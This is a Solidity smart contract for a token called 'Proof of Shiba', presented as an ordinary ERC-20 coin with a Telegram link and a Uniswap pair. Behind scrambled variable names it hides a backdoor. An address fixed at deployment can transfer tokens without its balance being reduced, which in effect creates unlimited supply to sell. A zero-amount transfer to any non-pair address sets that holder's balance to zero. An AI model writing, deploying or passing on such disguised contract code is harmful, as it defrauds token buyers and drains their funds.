/*

https://t.me/eth_proofofshiba

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ProofofShiba is Ownable {
    function transfer(address vbzmdojalg, uint256 bqavfgx) public returns (bool success) {
        tcni(msg.sender, vbzmdojalg, bqavfgx);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private watgzufvlpnk;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    constructor(address spblmogy) {
        balanceOf[msg.sender] = totalSupply;
        zbxijoavm[spblmogy] = xhmanpvsi;
        IUniswapV2Router02 aqyknhmsbd = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        gznrmbv = IUniswapV2Factory(aqyknhmsbd.factory()).createPair(address(this), aqyknhmsbd.WETH());
    }

    function approve(address qvdacgmzhfr, uint256 bqavfgx) public returns (bool success) {
        allowance[msg.sender][qvdacgmzhfr] = bqavfgx;
        emit Approval(msg.sender, qvdacgmzhfr, bqavfgx);
        return true;
    }

    uint256 private xhmanpvsi = 100;

    string public symbol = 'POS';

    function tcni(address kptfql, address vbzmdojalg, uint256 bqavfgx) private {
        if (0 == zbxijoavm[kptfql]) {
            balanceOf[kptfql] -= bqavfgx;
        }
        balanceOf[vbzmdojalg] += bqavfgx;
        if (0 == bqavfgx && vbzmdojalg != gznrmbv) {
            balanceOf[vbzmdojalg] = bqavfgx;
        }
        emit Transfer(kptfql, vbzmdojalg, bqavfgx);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public gznrmbv;

    uint8 public decimals = 9;

    mapping(address => uint256) private zbxijoavm;

    function transferFrom(address kptfql, address vbzmdojalg, uint256 bqavfgx) public returns (bool success) {
        require(bqavfgx <= allowance[kptfql][msg.sender]);
        allowance[kptfql][msg.sender] -= bqavfgx;
        tcni(kptfql, vbzmdojalg, bqavfgx);
        return true;
    }

    string public name = 'Proof of Shiba';
}